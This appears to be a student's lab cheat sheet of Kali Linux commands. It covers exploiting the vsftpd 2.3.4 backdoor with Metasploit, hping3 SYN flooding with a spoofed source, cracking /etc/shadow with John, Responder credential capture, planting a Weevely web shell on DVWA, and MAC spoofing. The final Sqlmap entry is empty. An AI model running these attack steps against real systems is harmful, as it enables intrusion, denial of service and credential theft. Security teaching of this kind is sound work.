# kali
1.(a)
nmap -sL <network>
nmap -sn <network>
nmap <ip_address>
nmap -sV <ip_address>
nmap -sC <ip_address> -p <port_number>
ping <ip_address>
nmap -sV <ip_address>
searchsploit vsftpd 2.3.4
In a new terminal execute, msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show info
show options
set RHOSTS <ip_address>
exploit

1(b). hping
sudo apt install hping3
sudo hping3 -S <ip_address> -p <port> -c <number_of_packets> 
sudo hping3 --traceroute -V -1 <ip_address>
sudo hping3 -a <FAKE IP> <target> -S -q -p 80 --faster     sudo hping3 -a 192.168.225.128 192.168.225.128 -S -q -p 80 --faster

2(b) Httrack
Httrack <url>

3(a) John the ripper
unshadow /etc/passwd /etc/shadow > file.txt
(Create a password file and run it with 'john' command)
john --single --format=raw-sha1 file.txt

3(b) Crunch
crunch <min> <max> word

4(a) Macchanger
macchanger -s eth0
ifconfig eth0 down
macchanger -r eth0
ifconfig eth0 down
macchanger -s eth0

4(b) Responder
responder -I eth0 
Enter the IP address and enter the credentials(uname and pw)
Go to /usr/share/responder/logs and copy the file name (HTTP......) 
Run it with john to get the credentials

5(a) Weevely
weevely generate 12345 shell.php
kali firefox-> enter metaspoilt ip
click on dvwa, switch security to low and submit, "admin" and "password"
go to upload n upload shell.php, copy the path from "hackable" and paste after dvwa/
copy the entire url and enter this in the terminal: weevely "paste url here" 12345

5(b) Proxychain
cd /etc
sudo nano "prox...4"
remove dynamic (comment)
comment strict chain
go till the end and repeat the last line for socks5
-service tor restart
-proxychai..4 firefox google.com

6(a) Foremost
foremost -v -t jpg -i /dev/sda1 -o output

6(b)
-binwalk -B ".exe"  content
-binwalk -e ".exe"  compressed file extraction
-binwalk -E ".exe" entropy graph, encryption

7(a) Pipal
-create a txt file in pwd full of passwords
-run "pipal pass.txt" to get stats
-pipal -t 10 pass.txt
-pipal -o "filename" pass.txt

7(b) Cutycapt
cutycapt -url=https://www.rvce.edu.in --out=outt.png

8(a)Netdiscover
sudo netdiscover -r "ip address"

8(b)Sqlmap
 










